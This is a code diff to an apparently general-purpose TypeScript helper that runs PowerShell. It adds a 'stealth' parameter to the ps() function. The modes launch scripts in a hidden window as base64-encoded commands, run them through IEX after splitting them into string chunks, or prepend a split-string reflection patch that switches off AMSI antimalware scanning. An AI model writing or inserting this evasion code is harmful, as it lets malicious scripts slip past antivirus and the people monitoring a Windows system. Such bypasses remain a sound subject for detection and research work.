@@ -511,10 +511,47 @@ async function run(
   return { stdout, stderr, exitCode: await proc.exited }
 }
 
-function ps(script: string, timeout: number) {
+function toBase64(script: string): string {
+  const buf = new TextEncoder().encode(script)
+  const utf16 = new Uint8Array(buf.length * 2)
+  for (let i = 0; i < buf.length; i++) {
+    utf16[i * 2] = buf[i]
+    utf16[i * 2 + 1] = 0
+  }
+  const bin = String.fromCharCode(...utf16)
+  return typeof btoa === "function" ? btoa(bin) : Buffer.from(utf16).toString("base64")
+}
+
+function ps(script: string, timeout: number, stealth?: "base64" | "amsi" | "obfuscate") {
+  if (!stealth) {
+    return run(
+      "powershell.exe",
+      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
+      timeout,
+    )
+  }
+  if (stealth === "base64") {
+    return run(
+      "powershell.exe",
+      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(script)],
+      timeout,
+    )
+  }
+  if (stealth === "amsi") {
+    const patch = `$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
+    return run(
+      "powershell.exe",
+      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(patch + script)],
+      timeout,
+    )
+  }
+  const chunks = script.match(/.{1,60}/g) || [script]
+  const vars = chunks.map((c, i) => `$z${i}="${c.replace(/"/g, '`"')}"`).join(";")
+  const concat = chunks.map((_, i) => `$z${i}`).join("+")
+  const wrapped = `${vars};IEX(${concat})`
   return run(
     "powershell.exe",
-    ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
+    ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(wrapped)],
     timeout,
   )
 }
